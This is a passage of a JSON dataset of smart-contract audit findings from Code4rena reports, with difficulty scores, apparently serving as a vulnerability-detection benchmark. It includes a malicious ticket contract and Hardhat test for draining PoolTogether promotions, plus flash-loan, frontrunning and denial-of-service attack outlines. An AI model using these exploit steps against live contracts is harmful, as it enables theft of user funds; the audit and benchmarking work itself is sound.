GPL-3.0\\npragma\\nsolidity\\n0.8\\n.\\n6\\n;\\nimport\\n\\\"hardhat/console.sol\\\"\\n;\\ncontract\\nTwabRewards\\n{\\nstruct\\nPromotion\\n{\\nuint216\\ntokensPerEpoch\\n;\\nuint32\\nstartTimestamp\\n;\\nuint32\\nepochDuration\\n;\\nuint8\\nnumberOfEpochs\\n;\\n}\\nmapping\\n(\\nuint256\\n=>\\nPromotion\\n)\\ninternal\\n_promotions\\n;\\nuint256\\ninternal\\n_latestPromotionId\\n;\\nmapping\\n(\\nuint256\\n=>\\nmapping\\n(\\naddress\\n=>\\nuint256\\n))\\ninternal\\n_claimedEpochs\\n;\\nconstructor\\n() {\\nuint\\nid\\n=\\ncreatePromotion\\n(\\n1\\n,\\nuint32\\n(\\nblock\\n.\\ntimestamp\\n)-\\n10\\n,\\n1\\n,\\n1\\n);\\nclaimRewards\\n(\\nid\\n,\\n1\\n);\\nclaimRewards\\n(\\nid\\n,\\n2\\n);\\nclaimRewards\\n(\\nid\\n,\\n3\\n);\\nclaimRewards\\n(\\nid\\n,\\n4\\n);\\nclaimRewards\\n(\\nid\\n,\\n5\\n);\\n}\\nfunction\\ncreatePromotion\\n(\\nuint216\\n_tokensPerEpoch\\n,\\nuint32\\n_startTimestamp\\n,\\nuint32\\n_epochDuration\\n,\\nuint8\\n_numberOfEpochs\\n)\\npublic\\nreturns\\n(\\nuint256\\n) {\\nuint256\\n_nextPromotionId\\n=\\n_latestPromotionId\\n+\\n1\\n;\\n_latestPromotionId\\n=\\n_nextPromotionId\\n;\\n_promotions\\n[\\n_nextPromotionId\\n] =\\nPromotion\\n(\\n_tokensPerEpoch\\n,\\n_startTimestamp\\n,\\n_epochDuration\\n,\\n_numberOfEpochs\\n);\\nreturn\\n_nextPromotionId\\n;\\n}\\nfunction\\nclaimRewards\\n(\\nuint256\\n_promotionId\\n,\\nuint256\\n_epochId\\n)\\npublic\\nreturns\\n(\\nuint256\\n) {\\nPromotion\\nmemory\\n_promotion\\n=\\n_getPromotion\\n(\\n_promotionId\\n);\\naddress\\n_user\\n=\\naddress\\n(\\n0\\n);\\nuint256\\n_rewardsAmount\\n;\\nuint256\\n_userClaimedEpochs\\n=\\n_claimedEpochs\\n[\\n_promotionId\\n][\\n_user\\n];\\nfor\\n(\\nuint256\\nindex\\n=\\n0\\n;\\nindex\\n<\\n1\\n;\\nindex\\n++) {\\nrequire\\n(\\n!\\n_isClaimedEpoch\\n(\\n_userClaimedEpochs\\n,\\n_epochId\\n),\\n\\\"TwabRewards/rewards-already-claimed\\\"\\n);\\n_rewardsAmount\\n+=\\n_calculateRewardAmount\\n(\\n_promotion\\n,\\n_epochId\\n);\\n_userClaimedEpochs\\n=\\n_updateClaimedEpoch\\n(\\n_userClaimedEpochs\\n,\\n_epochId\\n);\\n}\\n_claimedEpochs\\n[\\n_promotionId\\n][\\n_user\\n] =\\n_userClaimedEpochs\\n;\\nconsole\\n.\\nlog\\n(\\n\\\"Claiming for epoch\\\"\\n,\\n_epochId\\n,\\n_rewardsAmount\\n);\\nreturn\\n_rewardsAmount\\n;\\n}\\nfunction\\ngetPromotion\\n(\\nuint256\\n_promotionId\\n)\\npublic\\nview\\nreturns\\n(\\nPromotion\\nmemory\\n) {\\nreturn\\n_getPromotion\\n(\\n_promotionId\\n);\\n}\\nfunction\\n_getPromotion\\n(\\nuint256\\n_promotionId\\n)\\ninternal\\nview\\nreturns\\n(\\nPromotion\\nmemory\\n) {\\nreturn\\n_promotions\\n[\\n_promotionId\\n];\\n}\\nfunction\\n_isClaimedEpoch\\n(\\nuint256\\n_userClaimedEpochs\\n,\\nuint256\\n_epochId\\n)\\ninternal\\npure\\nreturns\\n(\\nbool\\n)\\n{\\nreturn\\n(\\n_userClaimedEpochs\\n>>\\n_epochId\\n) &\\nuint256\\n(\\n1\\n) ==\\n1\\n;\\n}\\nfunction\\n_calculateRewardAmount\\n(\\nPromotion\\nmemory\\n_promotion\\n,\\nuint256\\n_epochId\\n)\\ninternal\\nview\\nreturns\\n(\\nuint256\\n) {\\nuint256\\n_epochDuration\\n=\\n_promotion\\n.\\nepochDuration\\n;\\nuint256\\n_epochStartTimestamp\\n=\\n_promotion\\n.\\nstartTimestamp\\n+ (\\n_epochDuration\\n*\\n_epochId\\n);\\nuint256\\n_epochEndTimestamp\\n=\\n_epochStartTimestamp\\n+\\n_epochDuration\\n;\\nrequire\\n(\\nblock\\n.\\ntimestamp\\n>\\n_epochEndTimestamp\\n,\\n\\\"TwabRewards/epoch-not-over\\\"\\n);\\nreturn\\n1\\n;\\n}\\nfunction\\n_updateClaimedEpoch\\n(\\nuint256\\n_userClaimedEpochs\\n,\\nuint256\\n_epochId\\n)\\ninternal\\npure\\nreturns\\n(\\nuint256\\n) {\\nreturn\\n_userClaimedEpochs\\n| (\\nuint256\\n(\\n1\\n) <<\\n_epochId\\n);\\n}\\nfunction\\n_getCurrentEpochId\\n(\\nPromotion\\nmemory\\n_promotion\\n)\\ninternal\\nview\\nreturns\\n(\\nuint256\\n) {\\nreturn\\n(\\nblock\\n.\\ntimestamp\\n-\\n_promotion\\n.\\nstartTimestamp\\n) /\\n_promotion\\n.\\nepochDuration\\n;\\n}\\nfunction\\n_getRemainingRewards\\n(\\nPromotion\\nmemory\\n_promotion\\n)\\ninternal\\nview\\nreturns\\n(\\nuint256\\n) {\\n// _tokensPerEpoch * _numberOfEpochsLeft\\nreturn\\n_promotion\\n.\\ntokensPerEpoch\\n*\\n(\\n_promotion\\n.\\nnumberOfEpochs\\n-\\n_getCurrentEpochId\\n(\\n_promotion\\n));\\n}\\n}\"\n    ],\n    \"recommended_mitigation\": [\n      \"In the function\\\\_calculateRewardAmount()add something like the following in the beginning after the require.if ( \\\\_epochId >= \\\\_promotion.numberOfEpochs) return 0;\",\n      \"PierrickGT (PoolTogether) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 129,\n    \"bug_id\": \" H-05\",\n    \"bug_label\": \" S2-2\",\n    \"difficulty\": 10,\n    \"bug_description\": \" \\\"Malicious tickets can lead to the loss of all tokens\\\"\",\n    \"line\": \"TwabRewards[238,254,261,412,422]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-pooltogether#h-05-malicious-tickets-can-lead-to-the-loss-of-all-tokens\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by johnnycash, also found by WatchPug, csanuragjain, gpersoon, gzeon, harleythedog, kemmio, kenzo, leastwood, and pauliax\",\n      \"It allows an attacker to retrieve all the tokens of each promotions.\",\n      \"Anyone can create a new promotion usingcreatePromotion(). An attacker can create a new malicious promotion with the following parameters:\",\n      \"the address of a malicious ticket smart contract\",\n      \"the token address from the targeted promotion(s)\",\n      \"optionally,_numberOfEpochsequal to 0 to create this promotion for free\",\n      \"The only verification made on the ticket address given by_requireTicket()is that the smart contract must implement theITicketinterface.\",\n      \"The attacker can then callclaimRewards()with its wallet address, the malicious promotion id and a single _epochId for the sake of clarity.\",\n      \"_calculateRewardAmount()is first called to get the reward amount with the following formula(_promotion.tokensPerEpoch * _ticket.getAverageBalanceBetween()) / _ticket.getAverageTotalSuppliesBetween(). The malicious ticket can return an arbitrary_averageBalanceand an_averageTotalSuppliesof 1, leading to an arbitrary large reward amount.\",\n      \"_promotion.token.safeTransfer(_user, _rewardsAmount)is called. It transfers the amount of tokens previously computed to the attacker.\",\n      \"The attacker receives the tokens of other promotions without having spent anything.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"The malicious smart contract is a copy/paste ofTicketHarness.solandTicket.solwith the following changes:\",\n      \"/// @inheritdoc ITicket\\nfunction\\ngetAverageTotalSuppliesBetween\\n(\\nuint64\\n[]\\ncalldata\\n_startTimes\\n,\\nuint64\\n[]\\ncalldata\\n_endTimes\\n)\\nexternal\\nview\\noverride\\nreturns\\n(\\nuint256\\n[]\\nmemory\\n) {\\nuint256\\n[]\\nmemory\\n_balances\\n=\\nnew\\nuint256\\n[](\\n1\\n);\\n_balances\\n[\\n0\\n] =\\nuint256\\n(\\n1\\n);\\nreturn\\n_balances\\n;\\n}\\n/// @inheritdoc ITicket\\nfunction\\ngetAverageBalanceBetween\\n(\\naddress\\n_user\\n,\\nuint64\\n_startTime\\n,\\nuint64\\n_endTime\\n)\\nexternal\\nview\\noverride\\nreturns\\n(\\nuint256\\n) {\\nreturn\\n1337\\n;\\n}\",\n      \"The test for HardHat is:\",\n      \"describe\\n(\\n'exploit()'\\n,\\nasync\\n()\\n=>\\n{\\nit\\n(\\n'this shouldnt happen'\\n,\\nasync\\n()\\n=>\\n{\\nconst\\npromotionIdOne\\n=\\n1\\n;\\nconst\\npromotionIdTwo\\n=\\n2\\n;\\nawait\\nexpect\\n(\\ncreatePromotion\\n(\\nticket\\n.\\naddress\\n))\\n.\\nto\\n.\\nemit\\n(\\ntwabRewards\\n,\\n'PromotionCreated'\\n)\\n.\\nwithArgs\\n(\\npromotionIdOne\\n);\\nlet\\nevilTicketFactory\\n=\\nawait\\ngetContractFactory\\n(\\n'EvilTicket'\\n);\\nlet\\nevilTicket\\n=\\nawait\\nevilTicketFactory\\n.\\ndeploy\\n(\\n'EvilTicket'\\n,\\n'TICK'\\n,\\n18\\n,\\nwallet1\\n.\\naddress\\n);\\nlet\\ncreatePromotionTimestamp\\n= (\\nawait\\nethers\\n.\\nprovider\\n.\\ngetBlock\\n(\\n'latest'\\n)).\\ntimestamp\\n;\\nawait\\nexpect\\n(\\ntwabRewards\\n.\\nconnect\\n(\\nwallet2\\n).\\ncreatePromotion\\n(\\nevilTicket\\n.\\naddress\\n,\\nrewardToken\\n.\\naddress\\n,\\ntokensPerEpoch\\n,\\ncreatePromotionTimestamp\\n,\\n1\\n,\\n//epochDuration,\\n0\\n,\\n//epochsNumber,\\n)).\\nto\\n.\\nemit\\n(\\ntwabRewards\\n,\\n'PromotionCreated'\\n)\\n.\\nwithArgs\\n(\\npromotionIdTwo\\n);\\nawait\\nincreaseTime\\n(\\n100\\n);\\nconst\\nepochIds\\n= [\\n'100'\\n];\\nawait\\ntwabRewards\\n.\\nconnect\\n(\\nwallet2\\n).\\nclaimRewards\\n(\\nwallet2\\n.\\naddress\\n,\\npromotionIdTwo\\n,\\nepochIds\\n);\\n});\\n});\",\n      \"It results in the following error:\",\n      \"1) TwabRewards\\nexploit()\\nthis shouldnt happen:\\nError: VM Exception while processing transaction: reverted with reason string 'ERC20: transfer amount exceeds balance'\\nat TwabRewardsHarness.verifyCallResult (@openzeppelin/contracts/utils/Address.sol:209)\\nat TwabRewardsHarness.functionCallWithValue (@openzeppelin/contracts/utils/Address.sol:132)\\nat TwabRewardsHarness.functionCall (@openzeppelin/contracts/utils/Address.sol:94)\\nat TwabRewardsHarness._callOptionalReturn (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:92)\\nat TwabRewardsHarness.safeTransfer (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:25)\\nat TwabRewardsHarness.claimRewards (contracts/TwabRewards.sol:186)\"\n    ],\n    \"recommended_mitigation\": [\n      \"Maybe add a whitelist of trusted tickets?\",\n      \"PierrickGT (PoolTogether) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 130,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S3-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Wrong fee calculation after totalSupply was 0\\\"\",\n    \"line\": \"Basket[136,139]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-defiprotocol#h-01-wrong-fee-calculation-after-totalsupply-was-0\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by kenzo\",\n      \"handleFeesdoes not updatelastFeeifstartSupply == 0.\\nThis means that wrongly, extra fee tokens would be minted once the basket is resupplied andhandleFeesis called again.\",\n      \"Loss of user funds.\\nThe extra minting of fee tokens comes on the expense of the regular basket token owners, which upon withdrawal would get less underlying than their true share, due to the dilution of their tokens‚Äô value.\",\n      \"Submitted by gzeon, also found by 0x0x0x and TomFrenchBlockchain\",\n      \"There is no cap onLicenseFee. While change ofLicenseFeeis under 1 day timelock, introducing amaxLicenseFeecan improve credibility by removing the ‚Äúrug‚Äù vector. There is aminLicenseFeein the contracts, while imo make little sense to haveminLicenseFeebut notmaxLicenseFee.\",\n      \"An incorrectly setLicenseFeecan potentially lead to over/underflow inBasket.sol#L140-141which is used in most of the function.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"L141: the fee percent is multiplied by startSupply (=basket token total supply)L144 & L145: publisher / protocol owner receive basket tokens as fees paymentBasket.sol#L141\"\n    ],\n    \"recommended_mitigation\": [\n      \"Scenario:\",\n      \"All basket token holders are burning their tokens. The last burn would set totalSupply to 0.\",\n      \"After 1 day, somebody mints basket tokens.\",\n      \"handleFees would be called upon mint, and would just return since totalSupply == 0. Note: It does not update lastFee.\",\n      \"} else if (startSupply == 0) {\\nreturn;\\\"\",\n      \"The next block, somebody else mints a token. Now handleFees will be called and will calculate the fees according to the current supply and the time diff between now and lastFee:\",\n      \"uint256 timeDiff = (block.timestamp - lastFee);\"\n    ]\n  },\n  {\n    \"row_number\": 131,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S5-3\",\n    \"difficulty\": 3,\n    \"bug_description\": \" \\\"receiveCollateral() can be called by anyone\\\"\",\n    \"line\": \"StabilityPool[1143]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-yetifinance#h-01-receivecollateral-can-be-called-by-anyone\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by jayjonah8, also found by dalgarim and kenzo\",\n      \"In StabilityPool.sol, the receiveCollateral() function should be called by ActivePool per comments,  but anyone can call it passing in _tokens and _amounts args to update stability pool balances.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/StabilityPool.sol#L1143\"\n    ],\n    \"recommended_mitigation\": [\n      \"Allow only the ActivePool to call the receiveCollateral() function:\\nrequire(msg.sender = address(active pool address), ‚ÄúCan only be called by ActivePool‚Äù)\",\n      \"kingyetifinance(Yeti finance) confirmed:\",\n      \"@LilYeti: This was also caught by our official auditor, but good catch.\",\n      \"0xtruco (Yeti finance) commented:\",\n      \"Fixed this, #190, #285, already in codehttps://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/StabilityPool.sol#L1144\"\n    ]\n  },\n  {\n    \"row_number\": 132,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S6-3\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Yeti token rebase checks the additional token amount incorrectly\\\"\",\n    \"line\": \"sYETIToken[247]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-yetifinance#h-02-yeti-token-rebase-checks-the-additional-token-amount-incorrectly\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by hyh\",\n      \"The condition isn‚Äôt checked now as the whole balance is used instead of the Yeti tokens bought back from the market.\\nAs it‚Äôs not checked, the amount added toeffectiveYetiTokenBalanceduring rebase can exceed the actual amount of the Yeti tokens owned by the contract.\\nAs the before check amount is calculated as the contract net worth, it can be fixed by immediate buy back, but it will not be the case.\",\n      \"The deficit of Yeti tokens can materialize in net worth terms as well if Yeti tokens price will raise compared to the last used one.\\nIn this case users will be cumulatively accounted with the amount of tokens that cannot be actually withdrawn from the contract, as its net holdings will be less then total users‚Äô claims.\\nIn other words, the contract will be in default if enough users claim after that.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"In ActivePool‚ÄôssendCollateralsUnwrap(which is used throughout the protocol), it firsts unwraps the asset, and only afterwards callsclaimRewardForwhich will update the rewards:(Code ref)\",\n      \"IWAsset\\n(\\n_tokens\\n[\\ni\\n]).\\nunwrapFor\\n(\\n_to\\n,\\n_amounts\\n[\\ni\\n]);\\nif\\n(\\n_collectRewards\\n) {\\nIWAsset\\n(\\n_tokens\\n[\\ni\\n]).\\nclaimRewardFor\\n(\\n_to\\n);\\n}\",\n      \"claimRewardForwill end up calling_userUpdate:(Code ref)\",\n      \"function\\n_userUpdate\\n(\\naddress\\n_user\\n,\\nuint256\\n_amount\\n,\\nbool\\n_isDeposit\\n)\\nprivate\\nreturns\\n(\\nuint\\npendingJoeSent\\n) {\\nuint256\\naccJoePerShare\\n=\\n_MasterChefJoe\\n.\\npoolInfo\\n(\\n_poolPid\\n).\\naccJoePerShare\\n;\\nUserInfo\\nstorage\\nuser\\n=\\nuserInfo\\n[\\n_user\\n];\\nif\\n(\\nuser\\n.\\namount\\n>\\n0\\n) {\\nuser\\n.\\nunclaimedJOEReward\\n=\\nuser\\n.\\namount\\n.\\nmul\\n(\\naccJoePerShare\\n).\\ndiv\\n(\\n1e12\\n).\\nsub\\n(\\nuser\\n.\\nrewardDebt\\n);\\n}\\nif\\n(\\n_isDeposit\\n) {\\nuser\\n.\\namount\\n=\\nuser\\n.\\namount\\n.\\nadd\\n(\\n_amount\\n);\\n}\\nelse\\n{\\nuser\\n.\\namount\\n=\\nuser\\n.\\namount\\n.\\nsub\\n(\\n_amount\\n);\\n}\\nuser\\n.\\nrewardDebt\\n=\\nuser\\n.\\namount\\n.\\nmul\\n(\\naccJoePerShare\\n).\\ndiv\\n(\\n1e12\\n);\\n}\",\n      \"Now, as ActivePool has already calledunwrapForand has burnt the user‚Äôs tokens, and let‚Äôs assume they all were used as collateral, it means user.amount=0*, and the user‚Äôs unclaimedJOEReward won‚Äôt get updated to reflect the rewards from the last user update.\\nThis is why, indeed as the comment inunwrapForsays, user‚Äôs reward should be updated prior to that.\",\n      \"*Note: at the momentunwrapFordoesn‚Äôt updates the user‚Äôs user.amount, but as I detailed in another issue, that‚Äôs a bug, as that means the user will continue accruing rewards even after his JLP were removed from the protocol.\"\n    ],\n    \"recommended_mitigation\": [\n      \"It looks like only extra tokens should be used for the check, i.e. yetiToken.balance - effectiveYetiTokenBalance.\",\n      \"Now:\",\n      \"function rebase() external {\\n...\\nuint256 yetiTokenBalance = yetiToken.balanceOf(address(this));\\nuint256 valueOfContract = _getValueOfContract(yetiTokenBalance);\\nuint256 additionalYetiTokenBalance = ...\\nif (yetiTokenBalance < additionalYetiTokenBalance) {\\nadditionalYetiTokenBalance = yetiTokenBalance;\\n}\\neffectiveYetiTokenBalance = effectiveYetiTokenBalance.add(additionalYetiTokenBalance);\\n...n\\function _getValueOfContract(uint _yetiTokenBalance) internal view returns (uint256) {\\nuint256 adjustedYetiTokenBalance = _yetiTokenBalance.sub(effectiveYetiTokenBalance);\\nuint256 yusdTokenBalance = yusdToken.balanceOf(address(this));\\nreturn div(lastBuybackPrice.mul(adjustedYetiTokenBalance), (1e18)).add(yusdTokenBalance);\\n}\",\n      \"As the _getValueOfContract function isn‚Äôt used elsewhere, the logic can be simplified. To be:\",\n      \"function rebase() external {\\n...\\nuint256 adjustedYetiTokenBalance = (yetiToken.balanceOf(address(this))).sub(effectiveYetiTokenBalance);\\nuint256 valueOfContract = _getValueOfContract(adjustedYetiTokenBalance);\\nuint256 additionalYetiTokenBalance = ...\\nif (additionalYetiTokenBalance > adjustedYetiTokenBalance) {\\nadditionalYetiTokenBalance = adjustedYetiTokenBalance;\\n}\\neffectiveYetiTokenBalance = effectiveYetiTokenBalance.add(additionalYetiTokenBalance);\\n...\\nfunction _getValueOfContract(uint _adjustedYetiTokenBalance) internal view returns (uint256) {\\nuint256 yusdTokenBalance = yusdToken.balanceOf(address(this));\\nreturn div(lastBuybackPrice.mul(_adjustedYetiTokenBalance), (1e18)).add(yusdTokenBalance);\\n}\"\n    ]\n  },\n  {\n    \"row_number\": 133,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S1-1\",\n    \"difficulty\": 15,\n    \"bug_description\": \" \\\"Vaults with non-UST underlying asset vulnerable to flash loan attack on curve pool\\\"\",\n    \"line\": \"NonUSTStrategy[135]\",\n    \"url\": \" https://code4rena.com/reports/2022-01-sandclock#h-03-vaults-with-non-ust-underlying-asset-vulnerable-to-flash-loan-attack-on-curve-pool\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by camden, also found by cccz, cmichel, danb, defsec, harleythedog, hyh, kenzo, leastwood, palina, pauliax, pmerkleplant, Ruhum, WatchPug, and ye0lde\",\n      \"In short, theNonUSTStrategyis vulnerable to attacks by flash loans on curve pools.\",\n      \"Here‚Äôs an outline of the attack:\",\n      \"Assume there is a vault with DAI underlying and aNonUSTStrategywith a DAI / UST curve pool\",\n      \"Take out a flash loan of DAI\",\n      \"Exchange a ton of DAI for UST\",\n      \"The exchange rate from DAI to UST has gone up (!!)\",\n      \"Withdraw or deposit from vault with more favorable terms than market\",\n      \"Transfer back UST to DAI\",\n      \"Repay flash loan\",\n      \"Forge\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Here is my proof of concept:https://gist.github.com/CamdenClark/932d5fbeecb963d0917cb1321f754132\",\n      \"I can provide a full forge repo. Just ping me on discord.\",\n      \"Exploiting this line:https://github.com/code-423n4/2022-01-sandclock/blob/a90ad3824955327597be00bb0bd183a9c228a4fb/sandclock/contracts/strategy/NonUSTStrategy.sol#L135\"\n    ],\n    \"recommended_mitigation\": [\"Use an oracle\", \"naps62 (Sandclock) confirmed\"]\n  },\n  {\n    \"row_number\": 135,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S4-1\",\n    \"difficulty\": 6,\n    \"bug_description\": \" \\\"VaderPoolV2 minting synths & fungibles can be frontrun\\\"\",\n    \"line\": \"VaderPoolV2[153,311,322,346]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-vader#h-01-vaderpoolv2-minting-synths--fungibles-can-be-frontrun\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel, also found by cccz, Critical, danb, leastwood, and TomFrenchBlockchain\",\n      \"TheVaderPoolV2mintFungibleandmintSynthfunctions perform an unsafenativeAsset.safeTransferFrom(from, address(this), nativeDeposit)with a parameter-specifiedfromaddress.\",\n      \"Note that these functions are not called by the Router, they are directly called on the pool.\\nTherefore, users will usually be required to send two transactions, a first one approving the pool, and then a second one for the actualmintSynth.\",\n      \"An attacker can frontrun themintSynth(IERC20 foreignAsset, uint256 nativeDeposit, address from, address to)function, use the samefrom=victimparameter but change thetoparameter to the attacker.\",\n      \"It‚Äôs possible to frontrun victims stealing their native token deposits and receiving synths / fungible tokens.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Remove thefromparameter and always perform thesafeTransferFromcall withfrom=msg.sender.\",\n      \"SamSteinGG (Vader) acknowledged\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 136,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 3,\n    \"bug_description\": \" \\\"Oracle doesnÈà•Ê™õ calculate USDV/VADER price correctly\\\"\",\n    \"line\": \"LiquidityBasedTWAP[393]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-vader#h-03-oracle-doesnt-calculate-usdvvader-price-correctly\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by TomFrenchBlockchain, also found by danb and leastwood\",\n      \"Invalid values returned from oracle for USDV and VADER prices in situations where the oracle uses more than one foreign asset.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"The USDV price is calculated as so (for simplicity we‚Äôll consider a two pairs):\",\n      \"https://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/lbt/LiquidityBasedTWAP.sol#L393-L409\",\n      \"totalUSD =  (PriceForeign0InUSD * liquidityWeights[0] + PriceForeign1InUSD * liquidityWeights[1]) / totalUSDVLiquidityWeight;\",\n      \"totalUSDis then the average price of the foreign assets paired against USDV in terms of USD, weighted by the TVL of the relevant liquidity pool\",\n      \"totalUSDV =\\n(pairData0\\n.nativeTokenPriceAverage\\n.mul(pairData0.foreignUnit)\\n.decode144() * liquidityWeights[0] +\\npairData1\\n.nativeTokenPriceAverage\\n.mul(pairData1.foreignUnit)\\n.decode144() * liquidityWeights[1]) /\\ntotalUSDVLiquidityWeight;\\n// in pseudocode for readability\\ntotalUSDV = (USDVPriceInForeign0 * liquidityWeights[0] + USDVPriceInForeign1 * liquidityWeights[1]) /  totalUSDVLiquidityWeight\",\n      \"totalUSDVis then the average price of USDV in terms of each of the foreign assets, weighted by the TVL of the relevant liquidity pool.\",\n      \"It should be fairly clear that this is the incorrect calculation as all the terms intotalUSDVare in different units - you can‚Äôt average the price of USDV in ETH with the price of USDV in BTC and get a meaningful result.\",\n      \"It appears that the VADER team intended to calculate the price of USDV in terms of USD through a number of different paired assets and then average them at the end based on the liquidity in each pair but have started averaging too early.\",\n      \"High severity issue as the oracle is crucial for determining the exchange rate between VADER and USDV to be used for IL protection and minting/burning of USDV - an incorrect value will result in the protocol losing significant funds.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Review the algorithm used for calculating the prices of assets and ensure that it‚Äôs calculating what you expect.\",\n      \"SamSteinGG (Vader) acknowledged\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 137,\n    \"bug_id\": \" H-04\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Vader TWAP averages wrong\\\"\",\n    \"line\": \"LiquidityBasedTWAP[113]\",\n    \"url\": \" https://code4rena.com/reports/2021-12-vader#h-04-vader-twap-averages-wrong\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"The vader price inLiquidityBasedTWAP.getVaderPriceis computed using thepastLiquidityWeightsandpastTotalLiquidityWeightreturn values of thesyncVaderPrice.\",\n      \"ThesyncVaderPricefunction does not initialize all weights and the total liquidity weight does not equal the sum of the individual weights because it skips initializing the pair with the previous data if the TWAP update window has not been reached yet:\",\n      \"This bug leads to several different issues. A big one is that an attacker can break the price functions and make them revert.\\nObserve what happens if an attacker callssyncVaderPricetwice in the same block:\",\n      \"The first time any pairs that need to be updated are updated\",\n      \"On the second call_totalLiquidityWeightis initialized to zero and all pairs have already been updated and thus skipped._totalLiquidityWeightnever increases and the storage variabletotalLiquidityWeight[uint256(Paths.VADER)] = _totalLiquidityWeight = 0;is set to zero.\",\n      \"DoS because calls togetStaleVaderPrice/getVaderPricewill revert in_calculateVaderPricewhich divides bytotalLiquidityWeight = 0.\",\n      \"Attacker keeps double-callingsyncVaderPriceevery time an update window of one of the pairs becomes eligible to be updated.\",\n      \"This bug leads to using wrong averaging and ignoring entire pairs due to their weights being initialized to zero and never being changed if the update window is not met.\\nThis in turn makes it easier to manipulate the price as potentially only a single pair needs to be price-manipulated.\",\n      \"It‚Äôs also possible to always set thetotalLiquidityWeightto zero by callingsyncVaderPricetwice which in turn reverts all transactions making use of the price because of a division by zero in_caluclateVaderPrice.\\nAn attacker can break theUSDV.mintminting forever and any router calls toVaderReserve.reimburseImpermanentLossalso fail as they perform a call to the reverting price function.\"\n    ],\n    \"code_blocks\": [\n      \"function\\nsyncVaderPrice\\n()\\npublic\\noverride\\nreturns\\n(\\nuint256\\n[]\\nmemory\\npastLiquidityWeights\\n,\\nuint256\\npastTotalLiquidityWeight\\n)\\n{\\nuint256\\n_totalLiquidityWeight\\n;\\nuint256\\ntotalPairs\\n=\\nvaderPairs\\n.\\nlength\\n;\\npastLiquidityWeights\\n=\\nnew\\nuint256\\n[](\\ntotalPairs\\n);\\npastTotalLiquidityWeight\\n=\\ntotalLiquidityWeight\\n[\\nuint256\\n(\\nPaths\\n.\\nVADER\\n)];\\nfor\\n(\\nuint256\\ni\\n;\\ni\\n<\\ntotalPairs\\n; ++\\ni\\n) {\\nIUniswapV2Pair\\npair\\n=\\nvaderPairs\\n[\\ni\\n];\\nExchangePair\\nstorage\\npairData\\n=\\ntwapData\\n[\\naddress\\n(\\npair\\n)];\\n// @audit-info lastMeasurement is set in _updateVaderPrice to block.timestamp\\nuint256\\ntimeElapsed\\n=\\nblock\\n.\\ntimestamp\\n-\\npairData\\n.\\nlastMeasurement\\n;\\n// @audit-info update period depends on pair\\n// @audit-issue if update period not reached => does not initialize pastLiquidityWeights[i]\\nif\\n(\\ntimeElapsed\\n<\\npairData\\n.\\nupdatePeriod\\n)\\ncontinue\\n;\\nuint256\\npastLiquidityEvaluation\\n=\\npairData\\n.\\npastLiquidityEvaluation\\n;\\nuint256\\ncurrentLiquidityEvaluation\\n=\\n_updateVaderPrice\\n(\\npair\\n,\\npairData\\n,\\ntimeElapsed\\n);\\npastLiquidityWeights\\n[\\ni\\n] =\\npastLiquidityEvaluation\\n;\\npairData\\n.\\npastLiquidityEvaluation\\n=\\ncurrentLiquidityEvaluation\\n;\\n_totalLiquidityWeight\\n+=\\ncurrentLiquidityEvaluation\\n;\\n}\\ntotalLiquidityWeight\\n[\\nuint256\\n(\\nPaths\\n.\\nVADER\\n)] =\\n_totalLiquidityWeight\\n;\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Even iftimeElapsed < pairData.updatePeriod, the old pair weight should still contribute to the total liquidity weight and be set inpastLiquidityWeights.\\nMove the_totalLiquidityWeight += currentLiquidityEvaluationand thepastLiquidityWeights[i] = pastLiquidityEvaluationassignments before thecontinue.\",\n      \"SamSteinGG (Vader) confirmed\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 138,\n    \"bug_id\": \" H-05\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    